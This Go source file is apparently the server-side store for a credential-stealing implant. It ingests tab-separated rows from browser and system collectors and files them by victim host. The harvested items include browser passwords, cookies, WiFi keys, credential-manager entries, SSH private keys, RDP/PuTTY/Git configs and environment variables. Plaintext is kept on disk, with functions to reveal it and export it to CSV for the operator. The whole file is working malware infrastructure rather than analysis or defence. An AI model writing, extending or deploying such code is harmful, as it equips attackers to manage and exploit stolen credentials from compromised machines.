// Package creds stores credential material collected from one host.
//
// Rows arrive over the implant channel as tab-separated records:
//
//	kind \t source \t target \t user \t secret \t note \t path
//
// Wire kinds (browser collector / system collector):
//
//	C 浏览器账号   S Cookie        A 自动填充      N 说明
//	W WiFi         M 凭据管理器    F FTP/客户端    P PuTTY
//	G Git          K SSH 私钥      E 环境变量      R RDP/远程      X 其他配置
//
// Secret handling: plaintext is written to disk with 0600 and only returned by
// an explicit Reveal call, so page loads never put a password on the wire.
package creds

import (
	"crypto/sha256"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
)

const maxItems = 5000

// BrowserKind reports whether a row comes from the browser collector, so the
// console can split counters without knowing every collector name.
func BrowserKind(k string) bool {
	switch k {
	case "C", "S", "A", "N":
		return true
	}
	return false
}

// KindLabels maps wire kinds to Chinese labels used by the console and CSV.
var KindLabels = map[string]string{
	"C": "浏览器账号",
	"S": "Cookie",
	"A": "自动填充",
	"N": "说明",
	"W": "WiFi",
	"M": "凭据管理器",
	"F": "FTP/客户端",
	"P": "PuTTY",
	"G": "Git",
	"K": "SSH 私钥",
	"E": "环境变量",
	"R": "RDP/远程",
	"X": "其他配置",
}

type Item struct {
	ID        string `json:"id"`
	Kind      string `json:"kind"`
	Source    string `json:"source"`
	Target    string `json:"target"`
	User      string `json:"user"`
	Secret    string `json:"secret"` // plaintext on disk, masked in View
	HasSecret bool   `json:"has_secret"`
	Note      string `json:"note"`
	Path      string `json:"path"`
	At        int64  `json:"at"`
}

type Stats struct {
	Total   int `json:"total"`
	Browser int `json:"browser"`
	System  int `json:"system"`
	WiFi    int `json:"wifi"`
	CredMan int `json:"credman"`
	File    int `json:"file"`
	Key     int `json:"key"`
	Env     int `json:"env"`
}

type View struct {
	At      int64    `json:"at"`
	Stats   Stats    `json:"stats"`
	Kinds   []string `json:"kinds"`
	Sources []string `json:"sources"`
	Items   []Item   `json:"items"`
}

type collection struct {
	Host  string `json:"host"`
	At    int64  `json:"at"`
	Items []Item `json:"items"`
}

type Store struct {
	mu  sync.Mutex
	dir string
}

func New(dir string) *Store {
	_ = os.MkdirAll(dir, 0o700)
	return &Store{dir: dir}
}

func safeHost(host string) string {
	host = strings.Map(func(r rune) rune {
		if r < 32 || strings.ContainsRune(`/\:*?"<>|`, r) {
			return '_'
		}
		return r
	}, strings.TrimSpace(host))
	if host == "" {
		return "unknown"
	}
	return host
}

func (s *Store) path(host string) string {
	return filepath.Join(s.dir, safeHost(host)+".json")
}

// recordID dedupes a row: same collector + target + user + secret is the same
// fact. Note and path are allowed to drift (they carry timestamps and file
// locations that change between runs).
func recordID(kind, source, target, user, secret string) string {
	h := sha256.Sum256([]byte(strings.Join([]string{kind, source, target, user, secret}, "\x00")))
	return hex.EncodeToString(h[:])[:16]
}

func splitRow(line string) []string {
	f := strings.Split(strings.TrimRight(line, "\r"), "\t")
	for len(f) < 7 {
		f = append(f, "")
	}
	for i := range f {
		f[i] = strings.TrimSpace(f[i])
	}
	return f[:7]
}

// Put merges the rows streamed by one collection run. Returns how many new
// records were stored.
func (s *Store) Put(host, rows string, at int64) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	col := s.load(host)
	index := make(map[string]int, len(col.Items))
	for i, it := range col.Items {
		index[it.ID] = i
	}

	added := 0
	for _, line := range strings.Split(rows, "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		f := splitRow(line)
		// Reject noise: the implant stream can contain a truncated line after
		// a write error, and only known single-letter kinds are meaningful.
		if _, ok := KindLabels[f[0]]; !ok {
			continue
		}
		id := recordID(f[0], f[1], f[2], f[3], f[4])
		if i, ok := index[id]; ok {
			col.Items[i].At = at
			if f[5] != "" {
				col.Items[i].Note = f[5]
			}
			if f[6] != "" {
				col.Items[i].Path = f[6]
			}
			continue
		}
		index[id] = len(col.Items)
		col.Items = append(col.Items, Item{
			ID: id, Kind: f[0], Source: f[1], Target: f[2], User: f[3],
			Secret: f[4], Note: f[5], Path: f[6], At: at,
		})
		added++
	}

	sort.SliceStable(col.Items, func(i, j int) bool {
		a, b := col.Items[i], col.Items[j]
		if a.Kind != b.Kind {
			return a.Kind < b.Kind
		}
		if a.Source != b.Source {
			return a.Source < b.Source
		}
		return a.Target < b.Target
	})
	if len(col.Items) > maxItems {
		col.Items = col.Items[:maxItems]
	}
	col.Host = safeHost(host)
	col.At = at

	b, err := json.MarshalIndent(col, "", "  ")
	if err != nil {
		return added, err
	}
	return added, os.WriteFile(s.path(host), b, 0o600)
}

func (s *Store) load(host string) collection {
	var col collection
	if b, err := os.ReadFile(s.path(host)); err == nil {
		_ = json.Unmarshal(b, &col)
	}
	return col
}

// Get returns the masked view for the console.
func (s *Store) Get(host string) View {
	s.mu.Lock()
	defer s.mu.Unlock()
	col := s.load(host)
	v := View{At: col.At, Items: make([]Item, 0, len(col.Items)), Kinds: []string{}, Sources: []string{}}
	kinds := map[string]bool{}
	sources := map[string]bool{}
	for _, it := range col.Items {
		it.HasSecret = it.Secret != ""
		it.Secret = Mask(it.Secret)
		v.Items = append(v.Items, it)
		kinds[it.Kind] = true
		sources[it.Source] = true
		switch it.Kind {
		case "W":
			v.Stats.WiFi++
		case "M":
			v.Stats.CredMan++
		case "F", "P", "G", "R", "X":
			v.Stats.File++
		case "E":
			v.Stats.Env++
		case "K":
			v.Stats.Key++
		}
		if BrowserKind(it.Kind) {
			v.Stats.Browser++
		} else {
			v.Stats.System++
		}
	}
	v.Stats.Total = len(col.Items)
	for k := range kinds {
		v.Kinds = append(v.Kinds, k)
	}
	for k := range sources {
		v.Sources = append(v.Sources, k)
	}
	sort.Strings(v.Kinds)
	sort.Strings(v.Sources)
	return v
}

// Reveal returns plaintext secrets for the requested ids.
func (s *Store) Reveal(host string, ids []string) map[string]string {
	s.mu.Lock()
	defer s.mu.Unlock()
	col := s.load(host)
	want := make(map[string]bool, len(ids))
	for _, id := range ids {
		want[id] = true
	}
	out := map[string]string{}
	for _, it := range col.Items {
		if want[it.ID] && it.Secret != "" {
			out[it.ID] = it.Secret
		}
	}
	return out
}

// Export renders the collection as CSV (UTF-8 BOM so Excel detects UTF-8).
func (s *Store) Export(host string) ([]byte, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	col := s.load(host)
	var b strings.Builder
	if _, err := b.WriteString("\xef\xbb\xbf"); err != nil {
		return nil, err
	}
	w := csv.NewWriter(&b)
	_ = w.Write([]string{"类型", "类型名", "来源", "目标", "用户名", "密钥", "备注", "路径", "采集时间"})
	for _, it := range col.Items {
		label := KindLabels[it.Kind]
		if label == "" {
			label = it.Kind
		}
		_ = w.Write([]string{
			it.Kind, label, it.Source, it.Target, it.User, it.Secret, it.Note, it.Path,
			strconv.FormatInt(it.At, 10),
		})
	}
	w.Flush()
	if err := w.Error(); err != nil {
		return nil, err
	}
	return []byte(b.String()), nil
}

func (s *Store) Delete(host string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if err := os.Remove(s.path(host)); err != nil && !os.IsNotExist(err) {
		return err
	}
	return nil
}

// Mask keeps a 2+2 preview so an operator can tell rows apart without exposing
// the whole secret. Anything shorter than 8 runes is fully hidden.
func Mask(v string) string {
	v = strings.TrimSpace(v)
	if v == "" {
		return ""
	}
	r := []rune(v)
	if len(r) < 8 {
		return "••••"
	}
	return string(r[:2]) + "••••" + string(r[len(r)-2:])
}
